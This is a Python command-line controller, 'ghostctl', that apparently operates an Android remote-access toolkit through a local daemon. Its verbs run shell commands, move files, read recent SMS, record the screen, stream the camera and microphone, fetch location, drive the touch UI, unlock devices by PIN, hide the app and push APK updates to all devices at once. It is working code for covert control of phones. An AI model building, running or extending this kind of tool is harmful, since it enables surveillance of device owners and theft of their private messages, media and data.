#!/usr/bin/env python3
"""ghostctl CLI — talks to the daemon admin port (default 127.0.0.1:8444).

Usage:
  ghostctl.py list | status | devices
  ghostctl.py -d <id> shell "echo hi"
  ghostctl.py -d <id> files ls|tree|get|put ...
  ghostctl.py -d <id> sms recent [N]
  ghostctl.py -d <id> screen shot|record|live|stop|off ...
  ghostctl.py -d <id> cam snap|live|stop ...
  ghostctl.py -d <id> mic record|live|stop ...
  ghostctl.py -d <id> brightness get|set <0-255>
  ghostctl.py -d <id> volume get|set|mute|unmute [stream] [N]
  ghostctl.py -d <id> wake
  ghostctl.py -d <id> ui dump | ui find --text <t> | ui find --id <id>
  ghostctl.py -d <id> tap <x> <y> | tap <node-id>     (longclick same)
  ghostctl.py -d <id> type <text> | key <code> | swipe <x1> <y1> <x2> <y2>
  ghostctl.py -d <id> unlock <pin> | arm | disarm
  ghostctl.py -d <id> sidekick status|arm|disarm|ping|install [apk]
  ghostctl.py -d <id> loc once
  ghostctl.py -d <id> device info
  ghostctl.py -d <id> hide | unhide | status | ping
  ghostctl.py -d <id> update self|sidekick [--apk path]
  ghostctl.py -d <id> destroy
  ghostctl.py apks list
  ghostctl.py apks add ghostd|ghosta <path>   # place APK in server/apks/
  ghostctl.py --all update                        # broadcast
  ghostctl.py streams                             # live stream cache

JSON output by default; --pretty for humans.
Env: GHOSTCTL_ADMIN_HOST / GHOSTCTL_ADMIN_PORT (default 127.0.0.1:8444).
"""
import argparse
import json
import os
import shutil
import socket
import sys
from pathlib import Path

ADMIN_HOST = os.environ.get("GHOSTCTL_ADMIN_HOST", "127.0.0.1")
ADMIN_PORT = int(os.environ.get("GHOSTCTL_ADMIN_PORT", "8444"))

BASE = Path(__file__).resolve().parent
APK_DIR = BASE / "apks"
APK_NAMES = {"self": "ghostd.apk", "ghostd": "ghostd.apk",
             "sidekick": "ghosta.apk", "ghosta": "ghosta.apk"}

# Verbs passed through verbatim to the daemon command router (the daemon
# whitelist + client CommandHandler validate sub-verbs and args).
PASS_THROUGH = {
    "files", "sms", "screen", "cam", "mic", "brightness", "volume", "wake",
    "ui", "tap", "longclick", "type", "key", "swipe", "unlock", "arm",
    "disarm", "sidekick", "loc", "device", "hide", "unhide", "status", "ping",
}


def rpc(req):
    # admin socket timeout must exceed the command wait (screen shot with
    # consent flow can take 60s+)
    wait = float(req.get("wait", 10) or 10)
    with socket.create_connection((ADMIN_HOST, ADMIN_PORT), timeout=15) as s:
        s.settimeout(max(30.0, wait + 15.0))
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    return json.loads(buf)


def emit(data, pretty):
    if pretty:
        print(json.dumps(data, indent=2, sort_keys=True))
    else:
        print(json.dumps(data))


# verb -> (action, args). args validated by argparse, translated here.
def build_args(ns):
    verb = ns.verb
    if verb == "shell":
        return "shell", [" ".join(ns.rest)]
    if verb in PASS_THROUGH:
        return verb, list(ns.rest)
    sys.exit(f"unknown verb {verb}")


def parse_update(rest):
    """update self|sidekick [--apk path] -> (target, apk_path_or_None)."""
    r = list(rest)
    target = apk = None
    if r and r[0] in ("self", "sidekick"):
        target = r.pop(0)
    if r and r[0] == "--apk" and len(r) > 1:
        apk = r[1]
    elif r and not r[0].startswith("-"):
        apk = r[0]  # positional path also accepted
    if target not in ("self", "sidekick"):
        sys.exit("update: expected 'self' or 'sidekick' (optionally --apk path)")
    return target, apk


def apks_cmd(rest):
    """Local APK store management (server/apks/, gitignored)."""
    sub = rest[0] if rest else "list"
    if sub == "list":
        APK_DIR.mkdir(exist_ok=True)
        out = {}
        for f in sorted(APK_DIR.glob("*.apk")):
            out[f.name] = f.stat().st_size
        emit({"apks_dir": str(APK_DIR), "apks": out}, False)
        return
    if sub == "add":
        if len(rest) < 3 or rest[1] not in APK_NAMES:
            sys.exit("apks add: expected 'apks add ghostd|ghosta <path>'")
        name, src = APK_NAMES[rest[1]], Path(rest[2]).expanduser()
        if not src.is_file():
            sys.exit(f"no such file: {src}")
        APK_DIR.mkdir(exist_ok=True)
        shutil.copy2(src, APK_DIR / name)
        print(f"stored {src} -> {APK_DIR / name}")
        return
    sys.exit("apks: expected 'list' or 'add ghostd|ghosta <path>'")


def resolve_device(value):
    """Resolve a -d value: exact device id, exact/prefix id match, or the
    device's human name (case-insensitive) — set via `ghostctl.py rename`."""
    try:
        devices = rpc({"op": "list"}).get("devices") or {}
    except Exception:
        return value
    if value in devices:
        return value
    low = value.lower()
    # exact id prefix (short uuid)
    pref = [d for d in devices if d.startswith(value)]
    if len(pref) == 1:
        return pref[0]
    # name match (case-insensitive, exact then prefix)
    by_name = [d for d, r in devices.items()
               if isinstance(r, dict) and str(r.get("name", "")).lower() == low]
    if len(by_name) == 1:
        return by_name[0]
    by_name_p = [d for d, r in devices.items()
                 if isinstance(r, dict) and str(r.get("name", "")).lower().startswith(low)]
    if len(by_name_p) == 1:
        return by_name_p[0]
    return value


def main():
    p = argparse.ArgumentParser(prog="ghostctl", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-d", "--device", help="target device_id")
    p.add_argument("--all", action="store_true", help="broadcast to all devices")
    p.add_argument("--pretty", action="store_true", help="human-readable output")
    p.add_argument("--wait", type=float, default=10.0, help="seconds to wait for result")
    p.add_argument("verb", help="run ghostctl.py --help for the full verb list")
    p.add_argument("rest", nargs="*", help="verb arguments")
    ns, extra = p.parse_known_args()
    # unknown option-looking args (e.g. client-side `--fps 5`, `--quality 60`)
    # are passed through to the device verbatim
    ns.rest = list(ns.rest) + extra

    if ns.verb == "apks":  # local file management, no daemon needed
        apks_cmd(ns.rest)
        return
    if ns.verb == "streams":
        emit(rpc({"op": "streams"}), ns.pretty)
        return
    if ns.verb == "config":
        # `config` (show) or `config set <key> <value>`
        if ns.rest and ns.rest[0] == "set":
            if len(ns.rest) < 3:
                sys.exit("usage: ghostctl.py config set <max_pending|max_per_ip> <int>")
            emit(rpc({"op": "config", "args": ["set", ns.rest[1], ns.rest[2]]}),
                 ns.pretty)
        else:
            emit(rpc({"op": "config"}), ns.pretty)
        return
    if ns.verb == "pending" and not ns.device and not ns.all:
        emit(rpc({"op": "pending"}), ns.pretty)
        return
    if ns.verb in ("approve", "revoke"):
        # device id via -d or as the first positional arg
        did = ns.device or (ns.rest[0] if ns.rest else None)
        if not did:
            sys.exit(f"specify device id: ghostctl.py {ns.verb} <device_id>")
        emit(rpc({"op": ns.verb, "device_id": did}), ns.pretty)
        return
    if ns.verb == "rename":
        # rename <device-id-or-name> <new name...>  (name may contain spaces)
        if len(ns.rest) < 2:
            sys.exit("usage: ghostctl.py rename <device_id> <new name>")
        did = resolve_device(ns.rest[0])
        name = " ".join(ns.rest[1:])
        emit(rpc({"op": "rename", "device_id": did, "name": name}), ns.pretty)
        return
    if ns.verb in ("list", "status", "devices") and not ns.device and not ns.all:
        emit(rpc({"op": "list"}), ns.pretty)
        return
    if ns.verb == "update":
        target, apk = parse_update(ns.rest)
        if not ns.all and not ns.device:
            sys.exit("specify -d <device_id> or --all")
        emit(rpc({"op": "update", "device_id": ns.device, "target": target,
                  "apk": apk, "wait": ns.wait}), ns.pretty)
        return

    action, args = build_args(ns)
    if not ns.all and not ns.device:
        sys.exit("specify -d <device_id> or --all")
    resp = rpc({"op": "command", "all": ns.all, "device_id": ns.device,
                "action": action, "args": args, "wait": ns.wait})
    emit(resp, ns.pretty)
    if not resp.get("ok"):
        sys.exit(1)


if __name__ == "__main__":
    main()
